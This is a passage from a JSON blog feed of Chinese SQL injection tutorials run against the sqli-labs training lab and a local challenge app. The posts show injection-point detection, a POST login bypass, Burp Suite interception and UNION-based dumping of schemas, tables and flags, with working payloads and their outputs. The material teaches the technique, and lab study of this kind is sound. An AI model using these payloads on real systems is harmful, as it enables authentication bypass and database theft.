alt=\"image-20220929221450837\"></p>\n<p>由于查看发现是 GET 请求，因此礼节性地输入 id=1</p>\n<p><img src=\"image-20220929221657747.png\" alt=\"image-20220929221657747\"></p>\n<h3 id=\"尝试注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型-2\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929221831821.png\" alt=\"image-20220929221831821\"></p>\n<p>不报错，怀疑存在双引号注入。</p>\n<p>输入 1“  来看看是否报错</p>\n<p><img src=\"image-20220929221918225.png\" alt=\"image-20220929221918225\"></p>\n<p>那么， <code>&quot;1&quot;&quot;) LIMIT 0,1</code>  中，“1&quot;”)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型-2\">#</a> 确定注入类型</h3>\n<p>我们尝试：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-4</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;) --+</span><br></pre></td></tr></table></figure>\n<p>成功不报错。</p>\n<p><img src=\"image-20220929222215596.png\" alt=\"image-20220929222215596\"></p>\n<p>之后就可以愉快地<strong>确定列数</strong> + 使用<strong>联合查询泄露数据库信息</strong>了。</p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>通过闭合，确定单引号注入</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定列数为3</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span> <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; order by 4 --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">sql查询失败</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.联合查询泄露数据库信息</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>database() <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: emails,flag,users</span><br><span class=\"line\">Password: challenge</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&#x27;</span>flag<span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: flag,value</span></span><br><span class=\"line\"><span class=\"string\">Password: challenge</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.获取flag</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, flag, <span class=\"keyword\">value</span>)), database() <span class=\"keyword\">from</span> challenge.flag <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:<span class=\"keyword\">any</span>,flag8:sqlc,flag9:tasi,flag10:moo,flag12:<span class=\"literal\">false</span>,flag11:muse</span><br><span class=\"line\">Password: challenge</span><br></pre></td></tr></table></figure>\n<p>至此，字符型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "title": "POST注入",
            "date_published": "2022-09-29T13:49:22.000Z",
            "content_html": "<h1 id=\"sql-注入之post注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之post注入\">#</a> SQL 注入之 POST 注入</h1>\n<p>本篇使用 POST 注入。</p>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929203645441.png\" alt=\"image-20220929203645441\"></p>\n<p>果不其然，此输入框存在 SQL 注入。且报错信息为 <code>use near ''1'' and password='' LIMIT 0,1' at line 1</code></p>\n<p>提取出错点发生在这一句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;1&#x27;&#x27; and password=&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>接着，查看其 F12 发现，网页发送的是 POST 请求。</p>\n<p><img src=\"image-20220929204011334.png\" alt=\"image-20220929204011334\"></p>\n<p>然后通过继续深入查询网页源代码的 Elements 可以得到，两个 <code>&lt;input&gt;</code>  标签对应的变量名，<strong>Username</strong> 对应<strong> uname</strong>，<strong>Password</strong> 对应<strong> passwd</strong></p>\n<p><img src=\"image-20220929204648604.png\" alt=\"image-20220929204648604\"></p>\n<p>那么就可以构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929204929486.png\" alt=\"image-20220929204929486\"></p>\n<p>那么，基本上可以确定，此题存在 SQL 注入之一 ——POST 注入。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>输入 1’ # 查看是否依旧报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>不报错，说明是 POST 单引号注入。</p>\n<p><img src=\"image-20220929205132216.png\" alt=\"image-20220929205132216\"></p>\n<h3 id=\"是否可以构造非法查询\"><a class=\"markdownIt-Anchor\" href=\"#是否可以构造非法查询\">#</a> 是否可以构造非法查询</h3>\n<p>由于</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>username 是用单引号括起来的，为了让语法不出错，我们需要<strong>保留单引号</strong>。即，可以在 <code>uname=1' #&amp;passwd=1</code>  的 <code>' #</code> 之间<strong>插入我们想要的非法查询语句</strong>。</p>\n<p>因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span> #<span class=\"string\">&#x27; and password = &#x27;</span>xxx<span class=\"string\">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>登录成功:</p>\n<p><img src=\"image-20220929205718001.png\" alt=\"image-20220929205718001\"></p>\n<h2 id=\"使用burpsuit来做post注入\"><a class=\"markdownIt-Anchor\" href=\"#使用burpsuit来做post注入\">#</a> 使用 BurpSuit 来做 Post 注入</h2>\n<p>这里也稍微提及一下 BurpSuit 抓包工具的简单使用：</p>\n<h3 id=\"firefox浏览器配置\"><a class=\"markdownIt-Anchor\" href=\"#firefox浏览器配置\">#</a> FireFox 浏览器配置</h3>\n<p>FireFox 浏览器中，在” 工具栏 — 选项 — 高级 — 连接设置 “中，配置手动代理和端口号 (127.0.0.1 : <strong>9090</strong>)</p>\n<p><img src=\"image-20220929210357211.png\" alt=\"image-20220929210357211\"></p>\n<h3 id=\"burpsuit配置\"><a class=\"markdownIt-Anchor\" href=\"#burpsuit配置\">#</a> BurpSuit 配置</h3>\n<p>到 BurpSuit 里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : <strong>9090</strong>）</p>\n<p><img src=\"image-20220929210527792.png\" alt=\"image-20220929210527792\"></p>\n<h3 id=\"令burpsuit拦截到包\"><a class=\"markdownIt-Anchor\" href=\"#令burpsuit拦截到包\">#</a> 令 BurpSuit 拦截到包</h3>\n<p>点击 FireFox 的任意提交请求的按钮就可以令 BurpSuit 拦截到包。以 FireFox 为例就是，点击了这道题目中的 <code>Submit按钮</code>  或 使用 Hackbar 的 <code>Execute按钮</code> 。</p>\n<p><img src=\"image-20220929210640596.png\" alt=\"image-20220929210640596\"></p>\n<p>④在内容中鼠标右键点击后选择 Send to Reapeater</p>\n<p><img src=\"image-20220929210828967.png\" alt=\"image-20220929210828967\"></p>\n<p>⑤在 Reapter 中多次尝试修改注入内容来查看返回的包</p>\n<p>第一次注入尝试</p>\n<p><img src=\"image-20220929211038588.png\" alt=\"image-20220929211038588\"></p>\n<p>第二次注入尝试</p>\n<p><img src=\"image-20220929210956005.png\" alt=\"image-20220929210956005\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "整型注入",
            "date_published": "2022-09-28T16:27:56.000Z",
            "content_html": "<h1 id=\"sql注入之整型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之整型注入\">#</a> SQL 注入之整型注入</h1>\n<p>本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。</p>\n<h2 id=\"环境准备\"><a class=\"markdownIt-Anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<p>当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮</p>\n<p><img src=\"image-20220928202842147.png\" alt=\"image-20220928202842147\"></p>\n<p>之后点击 MySQL 管理器</p>\n<p><img src=\"image-20220928203059624.png\" alt=\"image-20220928203059624\"></p>\n<p>双击 localhost，账户名 root，密码 root 即可进入。</p>\n<p><img src=\"image-20220928203206981.png\" alt=\"image-20220928203206981\"></p>\n<p>打开浏览器，选择 sqli</p>\n<p><img src=\"image-20220928203903223.png\" alt=\"image-20220928203903223\"></p>\n<p>选择第一个 Setup</p>\n<p><img src=\"image-20220928203930840.png\" alt=\"image-20220928203930840\"></p>\n<p>出现这个界面，即完成了数据库的初始化</p>\n<p><img src=\"image-20220928203950837.png\" alt=\"image-20220928203950837\"></p>\n<p>点击后退键回到上一个页面，然后点击 Less-1</p>\n<p><img src=\"image-20220928204115026.png\" alt=\"image-20220928204115026\"></p>\n<p>出现 SQLI DUMB SERIES-1</p>\n<p><img src=\"image-20220928204123886.png\" alt=\"image-20220928204123886\"></p>\n<p>接下来以 Less-2 作为例子进行讲解：</p>\n<p><img src=\"image-20220928210728567.png\" alt=\"image-20220928210728567\"></p>\n<h2 id=\"sql注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#sql注入步骤\">#</a> SQL 注入步骤</h2>\n<h3 id=\"1判断是否有注入判断是否未严格校验\"><a class=\"markdownIt-Anchor\" href=\"#1判断是否有注入判断是否未严格校验\">#</a> ①判断是否有注入 (判断是否未严格校验)</h3>\n<h4 id=\"1可控参数的改变能否影响页面的显示结果\"><a class=\"markdownIt-Anchor\" href=\"#1可控参数的改变能否影响页面的显示结果\">#</a> 1) 可控参数的改变能否影响页面的显示结果</h4>\n<p>网页让输入 id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。</p>\n<p>点击查看网页源代码，在 Network 这里看到是 GET 请求。</p>\n<p><img src=\"image-20220928213756712.png\" alt=\"image-20220928213756712\"></p>\n<p>因此我们选择在链接后面加上 id 参数</p>\n<p><img src=\"image-20220928213510534.png\" alt=\"image-20220928213510534\"></p>\n<p>发现成功令其输出内容。</p>\n<p>此时我们再次改变 GET 请求中 id 的值，发现，内容会对应有所变化。</p>\n<p><img src=\"image-20220928214022889.png\" alt=\"image-20220928214022889\"></p>\n<h4 id=\"2输入的sql语句是否能报错\"><a class=\"markdownIt-Anchor\" href=\"#2输入的sql语句是否能报错\">#</a> 2) 输入的 SQL 语句是否能报错</h4>\n<p>因为能通过数据库的报错，看到数据库的一些语句痕迹</p>\n<p>我们假设它后台的查询语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> $id</span><br></pre></td></tr></table></figure>\n<p>猜想：能否通过加单引号令其出错？</p>\n<p>因为：</p>\n<p>如果是整型注入漏洞，则像 3’这样的字符传入 $id 处会引发错误。</p>\n<p>如果是单引号注入漏洞，像 3’这样的字符传入 $id 处也会引发错误。</p>\n<p><img src=\"image-20220928214501924.png\" alt=\"image-20220928214501924\"></p>\n<p>黄字部分的报错语句，非常之重要！</p>\n<p>near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第 1 行的 xxxxxxx 语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是 “输出了单引号后面的语句”——LIMIT 0,1。</p>\n<p>为了再次确定 near ‘xxxxxxxxxx’ at line 1 中在 LIMIT 0,1 之前的一个单引号是我们输入的单引号，我们再次改变 GET 请求中 &quot;’ '&quot;（单引号）变为 &quot;&quot;&quot;（双引号）</p>\n<p><img src=\"image-20220928215359897.png\" alt=\"image-20220928215359897\"></p>\n<p>发现成功令报错信息中 near 'xxxxx’中的 LIMIT 前一个符号发生改变。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，加入单引号会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; limit 0,1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#如果是单引号注入，加入单引号也会报错</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27;&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>据目前输入的结果来看，此网页存在 “整型注入” 或者 “单引号注入”</p>\n<h4 id=\"3输入的sql语句能否不报错\"><a class=\"markdownIt-Anchor\" href=\"#3输入的sql语句能否不报错\">#</a> 3) 输入的 SQL 语句能否不报错</h4>\n<p>为了查看我们的语句能够成功闭合</p>\n<p>那怎么区分到底是整型还是单引号呢？</p>\n<p>使用 # 来注释后面语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#加入#号后，两个语法依旧错误，故都会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; # limit 0,1</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27; #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>结果确实是报错。</p>\n<p><img src=\"image-20220928220327744.png\" alt=\"image-20220928220327744\"></p>\n<p>接下来我们删掉单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，则删掉单引号，保留#号后，不会报错！</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> # limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"string\">&#x27;2 #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928220529170.png\" alt=\"image-20220928220529170\"></p>\n<h3 id=\"2什么类型的注入\"><a class=\"markdownIt-Anchor\" href=\"#2什么类型的注入\">#</a> ②什么类型的注入</h3>\n<p>因此，此处经过上述报错信息确定，存在<strong>整型注入</strong>！</p>\n<h3 id=\"3语句是否能够被恶意修改\"><a class=\"markdownIt-Anchor\" href=\"#3语句是否能够被恶意修改\">#</a> ③语句是否能够被恶意修改</h3>\n<p>恶意修改主要指能否再加入一些我们想要的判断条件，比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span># limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>如果是整型注入无误，这里条件为 “id = 2 and 0”—— 这是永假条件，则不会有任何查询结果。</p>\n<p><img src=\"image-20220928221547372.png\" alt=\"image-20220928221547372\"></p>\n<p>结果正如我们所料，空空如也。</p>\n<h3 id=\"4是否能够成功执行\"><a class=\"markdownIt-Anchor\" href=\"#4是否能够成功执行\">#</a> ④是否能够成功执行</h3>\n<p>第三个能满足，其实第四个就顺带就 OK。</p>\n<h3 id=\"5获取我们想要的数据\"><a class=\"markdownIt-Anchor\" href=\"#5获取我们想要的数据\">#</a> ⑤获取我们想要的数据</h3>\n<p>关键数据是保存在数据库里面的，关系如下：</p>\n<p>数据库 -&gt; 表 -&gt; 字段 -&gt; 值</p>\n<p>打开 MySQL，我们可以看到其中有 information_schema 库（这是 MySQL 自带的库，管理所有表信息）</p>\n<p><img src=\"image-20220928223622076.png\" alt=\"image-20220928223622076\"></p>\n<p>这个库中有三个表非常值得我们关注：</p>\n<p>Schemata 表（包含所有的 <code>库名信息</code> ）、Tables 表（包含所有的 <code>表名信息</code> ）、Columns 表（包含所有的 <code>列名信息</code> ）</p>\n<p><strong>首先是 Schemeta 表</strong>， <code>schema_name</code>  对应着所有数据库的名字。</p>\n<p><img src=\"image-20220928224006640.png\" alt=\"image-20220928224006640\"></p>\n<p><strong>其次是 Tables 表</strong>， <code>table_name</code>  这个列里，存储了 <code>table_schema对应的库</code> 下面的所有表</p>\n<p><img src=\"image-20220928224135720.png\" alt=\"image-20220928224135720\"></p>\n<p><strong>最后是 Columns 表</strong>，通过 <code>table_schema</code>  对应的库， <code>table_name</code>  对应的表，<strong>使用 column_name 对应的列名，来唯一地定位某个列</strong>。</p>\n<p><img src=\"image-20220928224405698.png\" alt=\"image-20220928224405698\"></p>\n<h4 id=\"1构造联合查询\"><a class=\"markdownIt-Anchor\" href=\"#1构造联合查询\">#</a> 1）构造联合查询</h4>\n<p>确定的整型注入中，我们需要构造出我们想要的查询内容，比如在<strong> information_schema 库</strong>的<strong> Schema 表</strong>中获取 <code>schema_name</code> ：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225341595.png\" alt=\"image-20220928225341595\"></p>\n<p>但如果像上面这样构造，会报错，我们需要使用到联合查询。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225106827.png\" alt=\"image-20220928225106827\"></p>\n<p>但是，如果像上面这样构造，依旧会报错，在 SQL 查询中，union 前后的两个列 ++<strong> 需要列数完全一致才可拼接</strong> ++。</p>\n<p>因此，需要使用占位符来定位前面的查询是多少列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#占位一个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span> #</span><br><span class=\"line\">#占位两个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span> #</span><br><span class=\"line\">#占位三个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> #</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n<p>注意，这里的 1,2,3 可以填任何数字或者符号，仅仅为了占位使用，<strong>可以被任意 “想要看到的输出内容” 覆盖</strong>。</p>\n<p>经过多次定位，我们最终得到：<strong>前面的查询</strong>使用到的是<strong> 3 个列</strong>。</p>\n<p><img src=\"image-20220928225313035.png\" alt=\"image-20220928225313035\"></p>\n<p>因此有：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225608030.png\" alt=\"image-20220928225608030\"></p>\n<p>虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用 union 查询，<strong>还有个 bug</strong> 就是如果前面的查询有效，<strong>最终结果会在前面查询到的结尾后面拼接</strong>。</p>\n<p>为了让后面查询到的内容（我们 <code>想要看到的数据</code> ）提前，<strong>我们需要令前面的查询失效</strong>，简单的方法就是令 id = 39888 这样平常不会使用的奇怪数字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225926603.png\" alt=\"image-20220928225926603\"></p>\n<h4 id=\"2拼接多组内容在同一行输出-寻找所在库\"><a class=\"markdownIt-Anchor\" href=\"#2拼接多组内容在同一行输出-寻找所在库\">#</a> 2）拼接多组内容在同一行输出、寻找所在库</h4>\n<p>OK，我们在第二个占位符（也就是数字 2 所在的位置）上，看到输出了一个 schema_name，但是我们想要输出所有的 schema_name，怎么办？</p>\n<p>使用 MySQL 查询语句提供的 group_concat () 函数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>可以看到，原本占位符 2 